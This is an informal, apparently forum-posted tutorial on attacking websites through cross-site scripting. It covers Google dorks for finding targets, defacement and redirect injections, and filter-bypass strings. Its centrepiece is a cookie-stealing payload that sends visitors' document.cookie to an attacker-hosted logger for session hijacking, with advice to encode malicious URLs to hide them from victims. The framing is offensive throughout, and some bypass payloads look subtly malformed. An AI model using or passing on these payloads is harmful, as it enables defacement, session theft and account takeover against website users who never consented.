~~~~~~~> wot is xss !!!

'XSS' also known as 'CSS' (Cross Site Scripting, Easily confused with 'Cascading Style Sheets')
is a very common vulnerbility found in Web Applications, 'XSS' allows the attacker to INSERT
malicous code, There are many types of XSS attacks, I will mention 3 of the most used.

The First Attack i wana talk about is 'URL XSS' this means that the XSS wont stay on the page
it will only get executed if you have the malicous code in the URL and submit the url
we will talk more on how to use this in our advantage.

The Second Attack is input fields, Where ever you can insert data, it is very common, to be XSS
vulnerable, for example say we found a site with a search engine, Now in the search box you enter
'hacker' now hit enter, when the page loads, if it says your data like 'Found 100 Results For hacker'
ok now you see its displaying out data on the page, now what if we can exexute code? there is no possible
way to execute PHP code in this Attack, but certainly is for HTML, Javascript, but be aware this method,
Also wont stay on the server, this is for your eyes only.

The Third Attack, with this attack you will be able to INSERT data (code) and it will stay on the website.
now there are 2 kinds, it depends if we can execute PHP or HTML if we can inject PHP then we can also
inject HTML but NOT vice versa, Ok this kinda attack is normally found on Blogs, Shoutboxes, Profiles
Forums, just most places where you insert data and it stays there. now HTML is totally diffrent then PHP
HTML downloads to your pc and then your 'Browser' parses/interprets the code, (thats why its source is viewable)
With PHP the code is interpretued on the server the script is hosted on, then the data is returned to the browser.
for PHP injection its rare, But it dont harm to try. Note: PHP code cant be injected into HTML page!

~~~~~> finding vul sites

Well to start finding these vulnerbilitys you can start checking out
Blogs, Forums, Shoutboxes, Comment Boxes, Search Box's, there are too many to mention.
u can also use common google dork like inurl:"search.php?q="

~~~~~~~~~> chking for vul

well the simplest technique is to enter

<script>alert("XSS")</script>

in either search columns /url etc...

if the site is vul then u shall see a dialogue box shouting XSS :P

**** and yes u can insert html too .... not just js

~~~~~~~~> deface
Code:
<html><body><IMG SRC="http://site.com/yourDefaceIMAGE.png"></body></html>


enter this in say search column , shoutbox etc where
Code:
"http://site.com/yourDefaceIMAGE.png"
is the link to the image file


u can also set up flash videos

<IMG SRC="http://site.com/yourDefaceIMAGE.png">

and if u wanna redirect ,

<script>window.open( "http://www.google.com/" )</script>

~~~~~~~~> lets steal some cookies !!!

first grab the cookie logger from here:
Code:
http://G0t-Root.net/tools/cookie.php


ok now you have it save it has a .php file and upload to your server, remember to create the file 'log.txt' too
and chmod it to 777, ok now find a XSS vulnerable website, any attack type will do.

ok now your gona want to insert this code.

Code:
window.location = "http://yourServer.com/cookielogger.php?c="+document.cookie


or

Code:
document.location = "http://yourServer.com/cookielogger.php?c="+document.cookie



now when user visits the page that got injected too, they will be sent to the site, and cookie will be stolen
the second one is more stealth.

Watch your file now for cookies, then you can hijack there session

but now you ask what if my site hasnt got, this kind of attack, it only shows data once and dont
store it. Well lets say we had a page search.php?q= we can use the following code to make a maliouc url from it
and maybe hex, base64 encode it so people cant see the code

Code:
http://site.com/search.php?q=document.location = "http://yourServer.com/cookielogger.php?c="+document.cookie


im not gona explain hexing it ect as it is pretty stright forward.

~~~~~~~> filtration bypassing

Some common methods to bypass filteration is

')alert('xss');

or

");alert('xss');

that will do the same thing has <script>alert("XSS")</script> on a vulnerable server.

You can also try hexing or base64 encoding your data before you submit,

Please note its bad practice to use alert("XSS") to test for XSS, has ive known sites block the keyword XSS
before.

Some other ways to bypass filteration
Code:
<script type=text/javascript>alert("t0pP8uZz")</script>
<script>alert("t0pP8uZz")</script>;
<script>alert("t0pP8uZz");</script>
<script>alert("/t0pP8uZz"/)</script>
<script>var var = 1; alert(var)</script>
